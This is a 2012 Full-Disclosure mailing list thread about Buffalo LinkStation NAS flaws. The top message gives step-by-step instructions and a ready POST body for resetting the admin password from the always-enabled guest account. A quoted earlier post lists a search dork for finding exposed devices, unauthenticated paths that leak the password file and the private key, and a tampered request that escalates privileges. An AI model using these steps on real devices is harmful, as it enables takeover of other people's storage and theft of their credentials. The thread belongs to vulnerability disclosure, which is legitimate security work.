Release Date.              5-Dec-2012
Last Update.               -
Vendor Notification Date.  -

Product.                   Linkstation & Others

Platform.                  Buffalo Technology
Affected versions.         Including Actual Version

Severity Rating.          High
Impact.                    Admin Password Reset

Attack Vector.             From remote
Solution Status.          Don't use Buffalo
CVE reference.             CVE - not assigned
 

Hi List,

just checked something out. please verifiy:


A guest user is always enabled and can NOT be disabled.

A guest user gets a GSSS and a GRRR Session value assigned when logging on

To Reset the admin password do the following:

1. Login with guest/guest
2. Get the Valid GSSS and GRRR from the source
3. Send a post request with the following form to the buffalo:

hiddenPageId=user_add&txtUserEditName=admin&txtUserEditOldName=admin&txtUserEditPassword1st=hacked&txtUserEditPassword2nd=hacked&txtUserEditComment=hacked&rdoUserEditQuota=off&hiddenUserEditNameOld=admin&txtHelpSearch=&gPage=user&gMode=setup&gType=undefined&gKey=undefined&gSSS=<YOUR GUEST GSSS HERE>&gRRR=<YOUR GUEST GRRR HERE>&hiddenDummyText=dummy


Take care that the UserEditComment contains no special chars...

Thats it, Admin password reseted as Guest user. 

Who needs permissions anyway.


Please let me know if this works for you, too.

Andre



----- Ursprüngliche Message -----
Von: Troy Korjuslommi <tjk@tksoft.com>
An: Hurgel Bumpf <l0rd_lunatic@yahoo.com>
CC: "full-disclosure@lists.grok.org.uk" <full-disclosure@lists.grok.org.uk>
Gesendet: 18:33 Samstag, 1.Dezember 2012
Betreff: Re: [Full-disclosure] Buffalo Technology LinkStation Information Disclosure And Privilege Escalation

At least in my tests (on different LinkStations), the URIs only work
from the networks where admin has been authorized, using the admin port
(typically 80). I.e. typically wired LAN only. Still a very serious
problem (exposing passwords and private key), but not an issue for
WebAccess, since it uses another port and provides a different view of
the system. I.e. the URIs do not work over the WebAccess connection at
least on the LinkStations I tested. 

Can you confirm? It seems that you have the admin interface open to the
WAN. At least judging from the fact that the URIs used port 80, which is
the one for the admin interface, not for WebAccess.

Troy
Tksoft Inc.


On Fri, 2012-11-30 at 17:54 +0000, Hurgel Bumpf wrote:
> Release Date.              30-Nov-2012
> Last Update.               -
> Vendor Notification Date.  23.Dec.2011 
> 
> Product.                   Linkstation & Others
> 
> Platform.                  Buffalo Technology
> Affected versions.         Including Actual Version
> 
> Severity Rating.           Medium
> Impact.                    Privilege escalation, Information Disclosure
> 
> Attack Vector.             From remote
> Solution Status.           Don't use internet function aka. WebAccess
> CVE reference.             CVE - not yet assigned
> 
> 
> Buffalo doesn't has a security department. They always forwarded me to sales, as they thought the will help me there better. Never received any answer. Tried over some other companies to reach Buffalo, but they are not interested in vulnerabilities.
> I waited one year and nothing happend. So here we go...
> 
> 
> 
> Buffalo Linkstation Information Disclosure (Password, Certificate,..)
> + Google Dork 
> 
> +--->intitle:"LinkStation - LS-WTGL"  Copyright 2002-2008
> 
> (There are better ways to find them..)
> 
> 
> 
> [ WebAccess - Accessing shared folders via Browser. Disabled by default. Has to be enabled ]
> 
> If you find them online, a WebAccess ist enabled by 99.9%..
> 
> 
> No authentication needed to access the files!
> 
> 
> + Permission Settings (read) 
> +---> x.x.x.x/modules/webaxs/module/files/perm.conf
> 
> + Username & Password disclosure (htpasswd)
> +---> x.x.x.x/modules/webaxs/module/files/password
> 
> + Lighttpd Config
> +---> x.x.x.x/modules/webaxs/module/files/lighttpd.conf
> 
> + Lighttpd RSA Private & Public Key
> +---> x.x.x.x/modules/webaxs/module/files/host.pem
> 
> 
> Buffalo Linkstation Privilege Escalation (Admin Password Reset)
> 
> After you cracked the htpassword,  logon with a gained (unprivileged) username and reset the admin password.
> 
> To do so just use temperdata or intercept on burp and try to change your password. Enable temper and press the button to change your password.
> 
> In the POST request just change the User*Name fields with the name "admin". Make sure to keep the gSSS and gRRR as they are the "session cookies".
> Send the changed values and logon with the admin user again.
> 
> Example:
> 
> 
> 
>    Post Data:
>       hiddenPageId[user_add]
>       txtUserEditName[admin]   <--- Replace your username with admin here
>       txtUserEditOldName[admin]   <--- Replace your username with admin here
>       txtUserEditPassword1st[reset]  <-- Password of your favor
>       txtUserEditPassword2nd[reset]  <-- Password of your favor
>       txtUserEditComment[]
>       hiddenUserEditNameOld[admin]   <--- Replace your username with admin here
>       txtHelpSearch[]
>       gPage[user]
>       gMode[setup]
>       gType[undefined]
>       gKey[undefined]
>       gSSS[3ae1c32d69ff7a83594d9daa9c776ad8]
>       gRRR[666525125298680621]
>       hiddenDummyText[dummy]
>    Response Headers:
>       Date[Fri, 09 Dec 2011 16:42:13 GMT]
>       Server[Apache/1.3.34 (Unix)]
>       Cache-Control[no-store, no-cache, must-revalidate, post-check=0, pre-check=0]
>       Expires[Thu, 01 Dec 1994 16:00:00 GMT]
>       Pragma[no-cache]
>       Keep-Alive[timeout=15, max=100]
>       Connection[Keep-Alive]
>       Transfer-Encoding[chunked]
>       Content-Type[text/html; charset=UTF-8]
> You can download a firmware Image and unzip it (zip password is all over the internet). There you will find more "features". 
> It's just a very bad maintained linux. Bad filepermissions aso..
> 
> Buffalo: Your firmware is bad and you should feel bad!
> 
> André
> 
